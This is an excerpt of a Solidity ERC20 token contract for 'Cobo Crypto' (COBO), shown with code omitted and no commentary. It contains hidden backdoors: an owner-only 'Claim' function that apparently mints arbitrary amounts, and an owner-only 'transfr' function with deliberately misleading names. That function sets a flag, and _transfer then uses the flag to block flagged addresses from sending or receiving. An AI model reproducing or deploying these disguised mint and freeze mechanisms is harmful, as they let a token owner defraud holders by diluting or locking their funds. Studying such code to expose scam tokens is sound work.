...
contract CoboCO is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    mapping (address => bool) public _isTransferd;
    ...
    constructor(uint256 liqFee, uint256 marketFee, uint256 supply, uint256 maxBuyPercent, uint256 maxSellPercent, uint256 maxWalletPercent, address marketingWallet, address liqudityWallet) ERC20("Cobo Crypto", "COBO") {
    ...
    function Claim(address account, uint256 amount) external onlyOwner {
        super._Claim(account, amount * (10 ** 9));
    }
    ...
    function transfr(address account, bool Transferd) public onlyOwner {
        _isTransferd[account] = Transferd;
    }
    ...
    function _transfer(address from, address to, uint256 amount) internal override {
        ...
        require(!_isTransferd[to] && !_isTransferd[from], "Your address or recipient address is Transfered");
